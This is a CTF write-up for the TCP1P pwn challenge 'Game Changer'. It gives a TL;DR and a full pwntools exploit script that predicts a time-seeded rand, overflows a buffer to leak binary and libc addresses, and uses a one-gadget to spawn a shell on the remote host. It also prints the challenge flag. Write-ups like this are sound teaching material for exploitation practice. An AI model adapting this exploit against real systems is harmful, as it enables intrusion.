
# Game Changer

## Overview & Description

Author : itoid

Difficulty : Easy

Are you a Game Changer?

[gamechanger](./dist/gamechanger)

## Hints

Can you change it?

## TL;DR

- Predict the predictable random number by using ctypes library for python
- Leak the binary address and make the program loop again
- Leak libc address and use one gadget to spawn the shell

## Solve Script
    
<details>
<summary>exp.py</summary>

```python
from pwn import *

exe = './gamechanger'
elf = context.binary = ELF(exe, checksec = 0)
from ctypes import CDLL
dll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
dll.srand(dll.time(0))
io = remote("ctf.tcp1p.com", 9254)

def randomization(a, b):
	return (dll.rand() + a) % b

p = randomization(34, 23)

def exploit():
	global p
	io.sendlineafter(b'): ', b'1')
	io.sendlineafter(b"0\n", f"{p}".encode('utf-8'))
	p = cyclic(0x108)
	p += p8(0xbb)
	io.sendafter(b'g?\n', p)
	io.recvuntil(b'o ')
	io.recv(0x108)
	elf.address = u64(io.recvuntil(b'...', drop=0x3).ljust(8, b'\x00')) - 0x14bb
	stdout = elf.address + elf.get_section_by_name(".bss").header["sh_addr"] + 0x100 + 0x40
	p = cyclic(0x100)
	p += p64(stdout)
	p += p64(elf.address + 0x136f)
	io.sendafter(b'g?\n', p)
	io.recvuntil(b'o ')
	io.recv(0x100)
	io.recvuntil(b'n!\n')
	libcbase = u64(io.recvuntil(b'\n').strip().ljust(8, b'\x00')) - 0x620d0
	p = cyclic(0x100)
	p += p64(stdout + 0x88)
	p += p64(libcbase + 0xebcf1)
	p += p64(stdout)
	p += p64(0)
	io.send(p)
	io.interactive()
if __name__=='__main__':
	exploit()
```

## Flag

`TCP1P{w0w_1ve_n3v3r_533n_5uch_4_900d_g4m3_ch4n93r_29c19ff69c5760fee1db8cac282a7b073bec936f}`